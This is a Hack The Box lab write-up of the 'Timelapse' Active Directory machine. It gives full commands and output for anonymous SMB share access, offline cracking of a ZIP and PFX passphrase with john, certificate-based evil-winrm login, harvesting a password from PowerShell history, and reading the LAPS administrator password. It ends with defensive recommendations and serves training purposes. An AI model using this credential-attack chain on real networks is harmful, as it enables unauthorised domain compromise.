---
title: "Timelapse — Certificate-Based WinRM Access and LAPS Password Disclosure"
description: "An SMB share exposes a protected certificate archive, and PowerShell history leaks a service account with LAPS read access."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - windows
  - active-directory
  - certificate-authentication
  - credential-abuse
  - laps
  - powershell-history
  - smb
objective: "Escalate from an unauthenticated SMB share to directory-level administrative control by cracking a protected certificate archive and abusing delegated LAPS read access."
tools:
  - nmap
  - NetExec
  - smbclient
  - 7z
  - john
  - openssl
  - evil-winrm
skill: "Offline credential recovery and certificate-based authentication abuse in Active Directory"
outcome: "Certificate-based WinRM user access and local Administrator control of the domain controller via a disclosed LAPS password"
---

## At a glance

| Field | Value |
|---|---|
| Difficulty | Easy |
| Target environment | Windows Server Active Directory domain controller |
| Starting position | Unauthenticated network access |
| Objective | Escalate from an unauthenticated SMB share to directory-level administrative control |
| Outcome | Certificate-based WinRM user shell and local Administrator control via a disclosed LAPS password |

## Certificate archive cracking to LAPS disclosure

Timelapse is an Easy-rated Hack The Box Windows Active Directory lab in which a world-readable SMB share, an exported WinRM certificate, and a service-account password left in shell history combine to give full control of the domain controller. The share exposes a password-protected ZIP archive containing a PKCS#12 (`.pfx`) certificate; the archive password and the certificate passphrase are both recovered offline with `john`. The certificate authenticates to WinRM as a standard user, whose PowerShell history discloses a service-account password. That account holds read access to the LAPS `ms-Mcs-AdmPwd` attribute, and the local Administrator password it yields grants control of the domain controller. Target identifiers, credentials, and secret values are replaced with role-based placeholders; command syntax is preserved. See [how evidence is handled](/method/).

**Attack path:** **Anonymous-readable SMB share → password-protected ZIP holding a PFX certificate → offline cracking of archive and certificate passphrases → certificate-based WinRM authentication → PowerShell history credential disclosure → LAPS read access → local Administrator password → directory-level control**

## Domain controller, anonymous share to directory control

- **Target:** Windows Active Directory domain controller.
- **Environment:** domain `<DIRECTORY_DOMAIN>`, directory server `<DIRECTORY_SERVER>`.
- **Key services:** DNS (53), Kerberos (88), LDAP (389), SMB (445), WinRM over HTTPS (5986).
- **Starting position:** unauthenticated network access, no provided credentials.
- **Objective:** move from anonymous SMB share access to directory-level administrative control and demonstrate the impact of credential exposure across artifacts.
- **Constraint:** activity was confined to the Hack The Box lab environment.

WinRM is exposed over HTTPS on 5986 rather than the default HTTP port 5985; HTTPS encrypts the transport, and this endpoint also accepts client-certificate authentication, which the path later uses.

## Evidence: archive cracking, certificate WinRM, history, LAPS

### 1. Service Enumeration

Observation: a full TCP service scan identifies the directory-services stack and a WinRM endpoint on HTTPS.

Action:

```bash
nmap -sC -sV -p- -Pn -T4 -oA <SCAN_OUTPUT_PREFIX> <TARGET_IP>
```

The source records the open services as DNS (53), Kerberos (88), LDAP (389), SMB (445), and WinRM over HTTPS (5986).

Significance: SMB is the exposed file-sharing surface, and the WinRM HTTPS listener on 5986 accepts client-certificate authentication, which the recovered certificate satisfies later.

Result: the directory server exposes SMB and an HTTPS WinRM endpoint that accepts client-certificate authentication, both of which the path later depends on.

### 2. Anonymous SMB Access and Share Discovery

Observation: SMB permits a null session, and share enumeration reveals one readable share alongside the administrative shares.

Action:

```bash
nxc smb <TARGET_IP> -u 'a' -p '' --shares
```

```text
ADMIN$        NO ACCESS
C$            NO ACCESS
IPC$          READ
NETLOGON      NO ACCESS
<READABLE_SHARE> READ
SYSVOL        NO ACCESS
```

A recursive download retrieves the share contents:

```bash
nxc smb <TARGET_IP> -u 'a' -p '' -M spider_plus
smbclient //<TARGET_IP>/<READABLE_SHARE> -U '%' -c 'recurse ON; prompt OFF; mget *'
```

```text
<ARCHIVE_DIRECTORY>/<WINRM_ARCHIVE>
<DOCUMENTATION_DIRECTORY>/LAPS.x64.msi
<DOCUMENTATION_DIRECTORY>/LAPS_Datasheet.docx
<DOCUMENTATION_DIRECTORY>/LAPS_OperationsGuide.docx
<DOCUMENTATION_DIRECTORY>/LAPS_TechnicalSpecification.docx
```

Significance: the archive is the primary target, and I inferred from the LAPS installer and documentation that LAPS is deployed in the domain, which is context for later enumeration.

Result: an unauthenticated user retrieves a WinRM backup archive and LAPS material from a readable share.

### 3. Archive and Certificate Cracking

Observation: I checked `<WINRM_ARCHIVE>` and found it protected with ZipCrypto Deflate; the certificate it contains is protected by its own passphrase.

Action:

```bash
7z l -slt <WINRM_ARCHIVE> | grep -i "method\|encrypt"
zip2john <WINRM_ARCHIVE> > zip.hash
john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

```text
<ARCHIVE_PASSWORD> (<WINRM_ARCHIVE>/<CERTIFICATE_BUNDLE>)
```

Extraction yields a PKCS#12 certificate bundle intended for WinRM authentication:

```bash
7z x -p<ARCHIVE_PASSWORD> <WINRM_ARCHIVE>
pfx2john <CERTIFICATE_BUNDLE> > pfx.hash
john pfx.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

```text
<PFX_PASSPHRASE> (<CERTIFICATE_BUNDLE>)
```

The certificate and private key are then exported for use:

```bash
openssl pkcs12 -in <CERTIFICATE_BUNDLE> -clcerts -nokeys -passin pass:<PFX_PASSPHRASE> -out <CERTIFICATE_FILE>
openssl pkcs12 -in <CERTIFICATE_BUNDLE> -nocerts -nodes -passin pass:<PFX_PASSPHRASE> -out <PRIVATE_KEY_FILE>
```

Significance: a PKCS#12 file is itself a credential, because it carries a certificate and private key accepted for WinRM authentication; recovering its passphrase grants authentication without a password.

Result: both passphrases are recovered offline, and the certificate's public and private components are exported.

### 4. Certificate-Based WinRM Authentication: User Access

Observation: the exported certificate and key can authenticate to the WinRM HTTPS endpoint.

Action:

```bash
evil-winrm -i <TARGET_IP> --cert-pem <CERTIFICATE_FILE> --priv-key-pem <PRIVATE_KEY_FILE>
```

```text
*Evil-WinRM* PS C:\Users\<INITIAL_USER>\Documents>
```

Significance: the recovered certificate provides an interactive session as `<INITIAL_USER>` without a password, and that session proves the certificate is accepted as a credential.

Result: the certificate yields an authenticated user-level session over WinRM.

### 5. PowerShell History Forensics: Service-Account Credential

Observation: the interactive shell's PSReadLine history retains earlier command text, including credentials passed as arguments.

Action:

```powershell
Get-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
```

```powershell
$p = ConvertTo-SecureString '<SERVICE_ACCOUNT_PASSWORD>' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('<SERVICE_ACCOUNT>', $p)
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami}
```

The exposed credential is subsequently validated over WinRM:

```bash
nxc winrm <TARGET_IP> -u '<SERVICE_ACCOUNT>' -p '<SERVICE_ACCOUNT_PASSWORD>'
```

```text
[+] <DIRECTORY_DOMAIN>\<SERVICE_ACCOUNT>:<SERVICE_ACCOUNT_PASSWORD> (Pwn3d!)
```

Significance: PSReadLine logs interactive command text by default, so a `ConvertTo-SecureString ... -AsPlainText` invocation leaves the service-account password readable to anyone who reaches the profile.

Result: the `<SERVICE_ACCOUNT>` credential is recovered from shell history and confirmed valid over WinRM.

### 6. LAPS Password Disclosure: Local Administrator

Observation: `<SERVICE_ACCOUNT>` can read the LAPS password attribute on computer objects.

Action:

```bash
evil-winrm -i <TARGET_IP> -u '<SERVICE_ACCOUNT>' -p '<SERVICE_ACCOUNT_PASSWORD>'
```

```powershell
Get-ADComputer <DIRECTORY_SERVER> -Property 'ms-Mcs-AdmPwd' | Select-Object 'ms-Mcs-AdmPwd'
```

```text
ms-Mcs-AdmPwd: <LAPS_ADMIN_PASSWORD>
```

The disclosed password authenticates as the local Administrator:

```bash
evil-winrm -i <TARGET_IP> -u '<LOCAL_ADMINISTRATOR>' -p '<LAPS_ADMIN_PASSWORD>'
```

```text
*Evil-WinRM* PS C:\Users\<LOCAL_ADMINISTRATOR>\Documents> whoami
<DIRECTORY_DOMAIN>\<LOCAL_ADMINISTRATOR>
```

Significance: LAPS stores per-machine local Administrator passwords in a confidential AD attribute, so delegated read access converts an ordinary service account into local Administrator control of the directory server.

Result: the local Administrator password is recovered, and the `whoami` output confirms administrative execution on the domain controller.

## Three obstacles: the HTTPS endpoint, the two passphrases, and the history file

| Challenge | Decision | Rationale |
|---|---|---|
| WinRM is exposed over HTTPS (5986) rather than HTTP (5985), and the source authenticates to it with a client certificate | Obtain and use the encrypted PFX certificate instead of a password | The PFX is itself the credential the endpoint accepts |
| The extracted certificate carries a passphrase separate from the archive password | Crack both with `john` before attempting authentication | Both are passphrase-protected and reachable from the unauthenticated share |
| Interactive shell history is easy to overlook | Inspect the PSReadLine history file after initial access | PSReadLine logs command text by default, including passwords passed as arguments |

## Outcome: certificate WinRM user and local Administrator

The recorded results show certificate-based WinRM authentication as the standard user `<INITIAL_USER>` and full administrative control of the domain controller as `<LOCAL_ADMINISTRATOR>`, with the latter confirmed by the `whoami` result `<DIRECTORY_DOMAIN>\<LOCAL_ADMINISTRATOR>`. Three exposures carry the path: a world-readable SMB share, an exported PKCS#12 certificate whose passphrase is crackable offline, and a service-account password left in PowerShell history. The service account's LAPS read delegation is what turns user access into domain-controller administration.

## Recommendations: share archives, shell history, and LAPS delegation

The attack path supports these controls, but the source contains no follow-up test of them.

1. **Sensitive archives on a readable share.** An unauthenticated user retrieved a WinRM backup archive from the share, and both of its layers fell to offline cracking. *Recommendation:* restrict share ACLs, keep credential-bearing archives off network shares, and protect PKCS#12 files with high-entropy passphrases or a certificate store rather than files on disk. *Detection:* monitor anonymous or unexpected share access and on transfers of backup archives.
2. **Plaintext credentials in shell history.** PSReadLine recorded the service-account password in cleartext; the credential gave the WinRM access and the subsequent LAPS read. *Recommendation:* never pass secrets as command-line arguments; use `Get-Credential` for interactive authentication or Windows Credential Manager for programmatic access, and clear or restrict history files. *Detection:* monitor for credential-bearing command lines through transcription or process auditing.
3. **Over-broad LAPS read delegation.** Because the service account could read `ms-Mcs-AdmPwd`, a routine account exposed the domain controller's local Administrator password. *Recommendation:* grant read access to that attribute only to a minimal break-glass operations group, audit the delegations regularly, and plan a migration to Windows LAPS, which supports encrypted password storage. *Detection:* monitor directory reads of confidential password attributes.

## References

- [Hack The Box — Timelapse](https://app.hackthebox.com/machines/Timelapse) (retired machine)
- [Windows LAPS overview (Microsoft Learn)](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview)
- [Windows LAPS schema extensions reference (Microsoft Learn)](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference)
- [MS-ADA2: Attribute ms-Mcs-AdmPwd (Microsoft Learn)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada2/ad2ce8fa-42a0-4371-ad18-5d1d1c488b22)
- [How to configure WinRM for HTTPS (Microsoft Learn)](https://learn.microsoft.com/en-us/troubleshoot/windows-client/system-management-components/configure-winrm-for-https)
- [Installation and configuration for Windows Remote Management (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/winrm/installation-and-configuration-for-windows-remote-management)
- [about_PSReadLine (Microsoft Learn)](https://learn.microsoft.com/en-us/powershell/module/psreadline/about/about_psreadline)
- [NetExec](https://github.com/Pennyw0rth/NetExec) (SMB and WinRM operations)
- [evil-winrm](https://github.com/Hackplayers/evil-winrm) (WinRM shell with certificate authentication)
- [John the Ripper](https://www.openwall.com/john/) (`zip2john` and `pfx2john` hash conversion)
- [OpenSSL `pkcs12`](https://docs.openssl.org/master/man1/openssl-pkcs12/) (PKCS#12 certificate and key extraction)
- [smbclient — Samba manual page](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html) (SMB file transfer)
- [7-Zip](https://7-zip.org/) (archive listing and extraction)
- [Nmap Reference Guide](https://nmap.org/book/man.html)
